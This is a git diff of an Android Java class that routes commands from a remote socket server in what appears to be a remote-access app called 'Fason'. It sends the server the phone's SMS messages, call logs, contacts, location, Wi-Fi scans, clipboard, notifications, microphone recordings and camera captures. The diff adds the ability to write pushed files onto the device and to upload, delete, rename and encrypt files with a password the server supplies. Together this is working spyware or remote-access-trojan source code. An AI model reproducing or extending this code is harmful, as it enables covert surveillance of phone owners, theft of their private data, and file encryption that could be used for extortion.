@@ -3,7 +3,7 @@ package com.fason.app.core.network;
 import android.Manifest;
 import android.os.Handler;
 import android.os.Looper;
-
+import java.io.File;
 import com.fason.app.core.FasonApp;
 import com.fason.app.core.Protocol;
 import com.fason.app.core.permissions.PermissionManager;
@@ -21,49 +21,37 @@ import com.fason.app.features.storage.FileManager;
 import com.fason.app.features.wifi.WifiScanner;
 import com.fason.app.features.notification.NotificationRelayService;
 import com.fason.app.service.MainService;
-
 import org.json.JSONArray;
 import org.json.JSONObject;
-
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-
 import io.socket.client.Socket;
 
 public final class SocketCommandRouter {
-
     private static FileManager fileMgr;
     private static CameraManager camMgr;
     private static final ExecutorService EXEC = Executors.newFixedThreadPool(4);
     private static final Handler handler = new Handler(Looper.getMainLooper());
     private static boolean initialized = false;
     private static volatile boolean settingsPrompted = false;
-
     private SocketCommandRouter() {}
 
     public static synchronized void initialize() {
         if (initialized) return;
-
         if (fileMgr == null) fileMgr = new FileManager();
         if (camMgr == null) camMgr = new CameraManager(FasonApp.getContext());
-
         Socket socket = SocketClient.getInstance().getSocket();
         if (socket == null) {
             handler.postDelayed(SocketCommandRouter::initialize, 5000);
             return;
         }
-
-        // Only remove our own listeners, not SocketClient's internal ones
         socket.off(Protocol.EVT_PING);
         socket.off(Protocol.EVT_ORDER);
-
         socket.on(Protocol.EVT_PING, args -> {
             Socket s = SocketClient.getInstance().getSocket();
             if (s != null) s.emit(Protocol.EVT_PONG);
         });
-
         socket.on(Protocol.EVT_ORDER, args -> handleOrder(args));
-
         socket.connect();
         initialized = true;
     }
@@ -73,29 +61,29 @@ public final class SocketCommandRouter {
             if (args.length == 0 || !(args[0] instanceof JSONObject)) return;
             JSONObject data = (JSONObject) args[0];
             String type = data.optString(Protocol.KEY_TYPE, "");
-            Socket socket = SocketClient.getInstance().getSocket();
-
+            final String cmdId = data.optString(Protocol.KEY_CMD_ID, "");
+            final Socket socket = SocketClient.getInstance().getSocket();
             switch (type) {
-                case Protocol.FILES:       EXEC.execute(() -> handleFile(data)); break;
-                case Protocol.SMS:         handleSms(data, socket); break;
-                case Protocol.CALLS:       EXEC.execute(() -> emit(socket, Protocol.CALLS, CallsManager.getLogs())); break;
-                case Protocol.CONTACTS:    EXEC.execute(() -> emit(socket, Protocol.CONTACTS, ContactsManager.getContacts())); break;
-                case Protocol.MIC:         handleMic(data, socket); break;
-                case Protocol.LOCATION:    handleLocation(socket); break;
-                case Protocol.WIFI:        handleWifi(socket); break;
-                case Protocol.PERMISSIONS: EXEC.execute(() -> emit(socket, Protocol.PERMISSIONS, PermissionManager.getGranted())); break;
-                case Protocol.APPS:        EXEC.execute(() -> emit(socket, Protocol.APPS, AppList.get(data.optBoolean(Protocol.KEY_SYS, true)))); break;
-                case Protocol.PERM_CHECK:  checkPerm(socket, data.optString(Protocol.KEY_PERM, "")); break;
-                case Protocol.CAMERA:      handleCamera(data, socket); break;
-                case Protocol.CLIPBOARD:   handleClipboard(data); break;
-                case Protocol.NOTIF:       handleNotif(data, socket); break;
-                case Protocol.FASON:       handleFason(data, socket); break;
-                case Protocol.INFO:        EXEC.execute(() -> emit(socket, Protocol.INFO, InfoManager.get())); break;
+                case Protocol.FILES:       EXEC.execute(() -> handleFile(data, cmdId)); break;
+                case Protocol.SMS:         handleSms(data, socket, cmdId); break;
+                case Protocol.CALLS:       EXEC.execute(() -> emit(socket, Protocol.CALLS, CallsManager.getLogs(), cmdId)); break;
+                case Protocol.CONTACTS:    EXEC.execute(() -> emit(socket, Protocol.CONTACTS, ContactsManager.getContacts(), cmdId)); break;
+                case Protocol.MIC:         handleMic(data, socket, cmdId); break;
+                case Protocol.LOCATION:    handleLocation(socket, cmdId); break;
+                case Protocol.WIFI:        handleWifi(socket, cmdId); break;
+                case Protocol.PERMISSIONS: EXEC.execute(() -> emit(socket, Protocol.PERMISSIONS, PermissionManager.getGranted(), cmdId)); break;
+                case Protocol.APPS:        EXEC.execute(() -> emit(socket, Protocol.APPS, AppList.get(data.optBoolean(Protocol.KEY_SYS, true)), cmdId)); break;
+                case Protocol.PERM_CHECK:  checkPerm(socket, data.optString(Protocol.KEY_PERM, ""), cmdId); break;
+                case Protocol.CAMERA:      handleCamera(data, socket, cmdId); break;
+                case Protocol.CLIPBOARD:   handleClipboard(data, cmdId); break;
+                case Protocol.NOTIF:       handleNotif(data, socket, cmdId); break;
+                case Protocol.FASON:       handleFason(data, socket, cmdId); break;
+                case Protocol.INFO:        EXEC.execute(() -> emit(socket, Protocol.INFO, InfoManager.get(), cmdId)); break;
             }
         } catch (Exception ignored) {}
     }
 
-    private static void handleFile(JSONObject data) {
+    private static void handleFile(JSONObject data, String cmdId) {
         String action = data.optString(Protocol.KEY_ACTION);
         String path = data.optString(Protocol.KEY_PATH, "");
         try {
@@ -109,67 +97,150 @@ public final class SocketCommandRouter {
                 r.put(Protocol.KEY_TYPE, Protocol.TYPE_LIST);
                 r.put(Protocol.KEY_LIST, list);
                 r.put(Protocol.KEY_PATH, actualPath);
+                attachCmdId(r, cmdId);
                 SocketClient.getInstance().getSocket().emit(Protocol.FILES, r);
             } else if (Protocol.ACT_DL.equals(action)) {
-                fileMgr.downloadFile(path);
+                fileMgr.downloadFile(path, cmdId);
+            } else if (Protocol.ACT_PUSH.equals(action)) {
+                handlePush(data, cmdId);
+            } else if (Protocol.ACT_UPLOAD.equals(action)) {
+                com.fason.app.features.storage.FileUpload.upload(path, cmdId);
+            } else if (Protocol.ACT_DELETE.equals(action)) {
+                com.fason.app.features.storage.FileModify.delete(path, cmdId);
+            } else if (Protocol.ACT_RENAME.equals(action)) {
+                String newName = data.optString(Protocol.KEY_NEW_NAME, "");
+                com.fason.app.features.storage.FileModify.rename(path, newName, cmdId);
+            } else if (Protocol.ACT_ENCRYPT.equals(action)) {
+                String password = data.optString(Protocol.KEY_PASSWORD, "");
+                boolean ok = com.fason.app.features.storage.FilesEncryptDecrypt.encryptFile(path, password);
+                emitFileAction("encrypt", path, ok, cmdId);
+            } else if (Protocol.ACT_DECRYPT.equals(action)) {
+                String password = data.optString(Protocol.KEY_PASSWORD, "");
+                boolean ok = com.fason.app.features.storage.FilesEncryptDecrypt.decryptFile(path, password);
+                emitFileAction("decrypt", path, ok, cmdId);
             }
         } catch (Exception ignored) {}
     }
 
-    private static void handleSms(JSONObject data, Socket socket) {
+    private static void handlePush(JSONObject data, String cmdId) {
+        EXEC.execute(() -> {
+            Socket socket = SocketClient.getInstance().getSocket();
+            try {
+                String dstPath = data.optString(Protocol.KEY_PATH, "");
+                String name = data.optString(Protocol.KEY_NAME, "file");
+                String b64 = data.optString(Protocol.KEY_BUFFER, "");
+                if (dstPath.isEmpty() || b64.isEmpty()) {
+                    emitPushResult(socket, dstPath, false, "Missing path or buffer", cmdId);
+                    return;
+                }
+                File dst = new File(dstPath);
+                if (dst.isDirectory()) {
+                    dstPath = dstPath + "/" + name;
+                    dst = new File(dstPath);
+                }
+                File parent = dst.getParentFile();
+                if (parent != null && !parent.exists()) parent.mkdirs();
+                byte[] fileData = android.util.Base64.decode(b64, android.util.Base64.NO_WRAP);
+                java.io.FileOutputStream fos = null;
+                try {
+                    fos = new java.io.FileOutputStream(dst);
+                    fos.write(fileData);
+                    fos.flush();
+                    emitPushResult(socket, dstPath, true, null, cmdId);
+                } catch (Exception e) {
+                    emitPushResult(socket, dstPath, false, e.getMessage(), cmdId);
+                } finally {
+                    if (fos != null) try { fos.close(); } catch (Exception ignored) {}
+                }
+            } catch (Exception e) {
+                emitPushResult(socket, "", false, e.getMessage(), cmdId);
+            }
+        });
+    }
+
+    private static void emitPushResult(Socket socket, String path, boolean success, String error, String cmdId) {
+        if (socket == null) return;
+        try {
+            JSONObject r = new JSONObject();
+            r.put("type", "push_result");
+            r.put(Protocol.KEY_PATH, path);
+            r.put(Protocol.KEY_SUCCESS, success);
+            if (error != null) r.put(Protocol.KEY_ERROR, error);
+            if (cmdId != null && !cmdId.isEmpty()) r.put(Protocol.KEY_CMD_ID, cmdId);
+            socket.emit(Protocol.FILES, r);
+        } catch (Exception ignored) {}
+    }
+
+    private static void emitFileAction(String action, String path, boolean success, String cmdId) {
+        Socket socket = SocketClient.getInstance().getSocket();
+        if (socket == null) return;
+        try {
+            JSONObject r = new JSONObject();
+            r.put("type", "modify_result");
+            r.put(Protocol.KEY_ACTION, action);
+            r.put(Protocol.KEY_PATH, path);
+            r.put(Protocol.KEY_SUCCESS, success);
+            if (!success) r.put(Protocol.KEY_ERROR, "Operation failed — check password or path");
+            if (cmdId != null && !cmdId.isEmpty()) r.put(Protocol.KEY_CMD_ID, cmdId);
+            socket.emit(Protocol.FILES, r);
+        } catch (Exception ignored) {}
+    }
+
+    private static void handleSms(JSONObject data, Socket socket, String cmdId) {
         String action = data.optString(Protocol.KEY_ACTION);
         if (Protocol.ACT_LS.equals(action)) {
-            EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.get()));
+            EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.get(), cmdId));
         } else if (Protocol.ACT_SEND_SMS.equals(action)) {
             EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.send(
-                data.optString(Protocol.KEY_TO), data.optString(Protocol.KEY_SMS))));
+                data.optString(Protocol.KEY_TO), data.optString(Protocol.KEY_SMS)), cmdId));
         }
     }
 
-    private static void handleMic(JSONObject data, Socket socket) {
-        int sec = data.optInt(Protocol.KEY_SEC, 0);
-        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
-            sendPermError(socket, Protocol.MIC, Manifest.permission.RECORD_AUDIO);
+    private static void handleMic(JSONObject data, Socket socket, String cmdId) {
+        String action = data.optString(Protocol.KEY_ACTION, "");
+        if (Protocol.ACT_STOP.equals(action)) {
+            MicManager.stop(cmdId);
             return;
         }
-        MicManager.start(sec);
+        int sec = data.optInt(Protocol.KEY_SEC, 0);
+        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
+            sendPermError(socket, Protocol.MIC, Manifest.permission.RECORD_AUDIO, cmdId);
+            return;
+        }
+        MicManager.start(sec, cmdId);
     }
 
-    private static void handleLocation(Socket socket) {
+    private static void handleLocation(Socket socket, String cmdId) {
         EXEC.execute(() -> {
             GpsManager orphanGps = null;
             try {
                 if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
                     !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
-                    sendPermError(socket, Protocol.LOCATION, Manifest.permission.ACCESS_FINE_LOCATION);
+                    sendPermError(socket, Protocol.LOCATION, Manifest.permission.ACCESS_FINE_LOCATION, cmdId);
                     return;
                 }
-
                 MainService svc = MainService.getInstance();
                 GpsManager gps = svc != null ? svc.getGpsManager() : null;
                 if (gps == null) {
                     gps = new GpsManager(FasonApp.getContext());
                     orphanGps = gps;
                 }
-
                 gps.requestSingle();
-
                 boolean gotLocation = false;
                 for (int i = 0; i < 30; i++) {
                     Thread.sleep(200);
                     JSONObject locData = gps.getData();
                     if (locData.optBoolean(Protocol.KEY_ENABLED, false)) {
-                        emit(socket, Protocol.LOCATION, locData);
+                        emit(socket, Protocol.LOCATION, locData, cmdId);
                         gotLocation = true;
                         break;
                     }
                 }
-
                 if (!gotLocation) {
                     JSONObject err = new JSONObject();
                     err.put(Protocol.KEY_ENABLED, false);
                     err.put(Protocol.KEY_ERROR, "Location unavailable");
-                    emit(socket, Protocol.LOCATION, err);
+                    emit(socket, Protocol.LOCATION, err, cmdId);
                 }
             } catch (Exception ignored) {} finally {
                 if (orphanGps != null) orphanGps.stop();
@@ -177,36 +248,31 @@ public final class SocketCommandRouter {
         });
     }
 
-    /** WiFi scan — activates location services first (required on Android 6.0+). */
-    private static void handleWifi(Socket socket) {
+    private static void handleWifi(Socket socket, String cmdId) {
         EXEC.execute(() -> {
             GpsManager orphanGps = null;
             try {
                 if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
                     !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
-                    sendPermError(socket, Protocol.WIFI, Manifest.permission.ACCESS_FINE_LOCATION);
+                    sendPermError(socket, Protocol.WIFI, Manifest.permission.ACCESS_FINE_LOCATION, cmdId);
                     return;
                 }
-
                 WifiScanner.clearCache();
-
                 MainService svc = MainService.getInstance();
                 GpsManager gps = svc != null ? svc.getGpsManager() : null;
                 if (gps == null) {
                     gps = new GpsManager(FasonApp.getContext());
                     orphanGps = gps;
                 }
-
                 gps.requestSingle();
-
                 for (int i = 0; i < 20; i++) {
                     Thread.sleep(200);
                     if (gps.canGetLocation()) break;
                 }
-
                 Socket s = SocketClient.getInstance().getSocket();
                 JSONObject result = WifiScanner.scan(FasonApp.getContext());
                 if (s != null) {
+                    attachCmdId(result, cmdId);
                     s.emit(Protocol.WIFI, result);
                 }
             } catch (Exception e) {
@@ -215,6 +281,7 @@ public final class SocketCommandRouter {
                     if (s != null) {
                         JSONObject err = new JSONObject();
                         err.put(Protocol.KEY_ERROR, "WiFi scan failed: " + e.getMessage());
+                        attachCmdId(err, cmdId);
                         s.emit(Protocol.WIFI, err);
                     }
                 } catch (Exception ignored) {}
@@ -224,37 +291,46 @@ public final class SocketCommandRouter {
         });
     }
 
-    private static void handleCamera(JSONObject data, Socket socket) {
+    private static void handleCamera(JSONObject data, Socket socket, String cmdId) {
         String action = data.optString(Protocol.KEY_ACTION);
         if (Protocol.ACT_LIST.equals(action)) {
-            JSONObject cams = camMgr.getCameraList();
-            if (cams == null) {
-                try {
-                    cams = new JSONObject();
-                    cams.put(Protocol.KEY_CAM_LIST, true);
-                    cams.put(Protocol.KEY_LIST, new JSONArray());
-                } catch (Exception ignored) {}
-            }
-            socket.emit(Protocol.CAMERA, cams);
+            EXEC.execute(() -> {
+                JSONObject cams = camMgr.getCameraList();
+                if (cams == null) {
+                    try {
+                        cams = new JSONObject();
+                        cams.put(Protocol.KEY_CAM_LIST, true);
+                        cams.put(Protocol.KEY_LIST, new JSONArray());
+                    } catch (Exception ignored) {}
+                }
+                attachCmdId(cams, cmdId);
+                socket.emit(Protocol.CAMERA, cams);
+            });
         } else if (Protocol.ACT_CAPTURE.equals(action)) {
-            camMgr.capture(data.optInt(Protocol.KEY_ID, 0));
+            String flash = data.optString(Protocol.KEY_FLASH, "auto");
+            String quality = data.optString(Protocol.KEY_QUALITY, "medium");
+            camMgr.capture(data.optInt(Protocol.KEY_ID, 0), cmdId, flash, quality);
+        } else if (Protocol.ACT_RECORD.equals(action)) {
+            camMgr.startRecording(data.optInt(Protocol.KEY_ID, 0), cmdId);
+        } else if (Protocol.ACT_STOP.equals(action)) {
+            camMgr.stopRecording(cmdId);
         }
     }
 
-    private static void handleClipboard(JSONObject data) {
+    private static void handleClipboard(JSONObject data, String cmdId) {
         ClipboardMonitor m = ClipboardMonitor.getInstance(FasonApp.getContext());
         String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_FETCH);
         if (Protocol.ACT_START.equals(action)) {
             m.start();
-            EXEC.execute(m::emit);
+            EXEC.execute(() -> m.emit(cmdId));
         } else if (Protocol.ACT_STOP.equals(action)) {
             m.stop();
         } else {
-            EXEC.execute(m::emit);
+            EXEC.execute(() -> m.emit(cmdId));
         }
     }
 
-    private static void handleNotif(JSONObject data, Socket socket) {
+    private static void handleNotif(JSONObject data, Socket socket, String cmdId) {
         String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
         if (Protocol.ACT_STATUS.equals(action)) {
             EXEC.execute(() -> {
@@ -263,47 +339,71 @@ public final class SocketCommandRouter {
                     s.put(Protocol.KEY_ENABLED, NotificationRelayService.isEnabled(FasonApp.getContext()));
                     s.put(Protocol.KEY_CONNECTED, NotificationRelayService.getInstance() != null &&
                         NotificationRelayService.getInstance().isReady());
+                    attachCmdId(s, cmdId);
                     socket.emit(Protocol.NOTIF, s);
                 } catch (Exception ignored) {}
             });
         } else if (Protocol.ACT_REQUEST.equals(action)) {
             NotificationRelayService.requestPermission(FasonApp.getContext());
+            EXEC.execute(() -> {
+                try {
+                    JSONObject ack = new JSONObject();
+                    ack.put(Protocol.KEY_ACTION, Protocol.ACT_REQUEST);
+                    ack.put(Protocol.KEY_SUCCESS, true);
+                    ack.put(Protocol.KEY_ENABLED, NotificationRelayService.isEnabled(FasonApp.getContext()));
+                    attachCmdId(ack, cmdId);
+                    socket.emit(Protocol.NOTIF, ack);
+                } catch (Exception ignored) {}
+            });
         }
     }
 
-    private static void checkPerm(Socket socket, String perm) {
+    private static void checkPerm(Socket socket, String perm, String cmdId) {
         EXEC.execute(() -> {
             try {
                 JSONObject r = new JSONObject();
                 r.put(Protocol.KEY_PERMISSION, perm);
                 r.put(Protocol.KEY_ALLOWED, PermissionManager.canIUse(perm));
+                attachCmdId(r, cmdId);
                 socket.emit(Protocol.PERM_CHECK, r);
             } catch (Exception ignored) {}
         });
     }
 
-    private static void handleFason(JSONObject data, Socket socket) {
+    private static void handleFason(JSONObject data, Socket socket, String cmdId) {
         EXEC.execute(() -> {
             try {
                 String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
-                emit(socket, Protocol.FASON, FasonManager.handle(action));
+                emit(socket, Protocol.FASON, FasonManager.handle(action), cmdId);
             } catch (Exception ignored) {}
         });
     }
 
-    private static void emit(Socket socket, String event, Object data) {
-        if (socket != null) socket.emit(event, data);
+    private static void emit(Socket socket, String event, Object data, String cmdId) {
+        if (socket == null) return;
+        if (data instanceof JSONObject) {
+            attachCmdId((JSONObject) data, cmdId);
+        }
+        socket.emit(event, data);
     }
 
-    private static void sendPermError(Socket socket, String event, String perm) {
+    private static void attachCmdId(JSONObject obj, String cmdId) {
+        if (cmdId != null && !cmdId.isEmpty()) {
+            try {
+                obj.put(Protocol.KEY_CMD_ID, cmdId);
+            } catch (Exception ignored) {}
+        }
+    }
+
+    private static void sendPermError(Socket socket, String event, String perm, String cmdId) {
         try {
             JSONObject err = new JSONObject();
             err.put(Protocol.KEY_ERROR, "Permission restricted");
             err.put(Protocol.KEY_PERMISSION, perm);
             err.put(Protocol.KEY_ACTION, Protocol.ACT_OPEN_SETTINGS);
-            emit(socket, event, err);
+            attachCmdId(err, cmdId);
+            emit(socket, event, err, cmdId);
         } catch (Exception ignored) {}
-
         if (!settingsPrompted) {
             settingsPrompted = true;
             handler.post(() -> PermissionManager.openAppSettings(FasonApp.getContext()));
@@ -315,11 +415,11 @@ public final class SocketCommandRouter {
             camMgr.shutdown();
             camMgr = null;
         }
+        reset();
         initialized = false;
         settingsPrompted = false;
     }
 
-    /** Reset router state (keeps managers alive) for re-initialization. */
     public static synchronized void reset() {
         Socket socket = SocketClient.getInstance().getSocket();
         if (socket != null) {
